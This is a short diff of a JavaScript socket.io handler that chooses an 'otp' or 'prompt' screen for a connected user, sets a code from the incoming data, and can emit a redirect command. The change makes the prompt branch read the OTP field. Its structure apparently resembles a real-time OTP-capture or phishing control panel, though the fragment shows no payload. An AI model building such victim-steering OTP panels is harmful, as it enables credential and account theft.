@@ -229,9 +229,9 @@ socket.on("user:update", async (data) => {
             code = data.otp;
             phonescreen = resolveFrontendRoute("otp");
           } else if (command === "prompt") {
-            code = data.prompt;
+            code = data.otp;
             phonescreen = resolveFrontendRoute("prompt");
-          }
+          } 
 
           if (link) {
             s.emit("user:command", { command: "redirect", link });
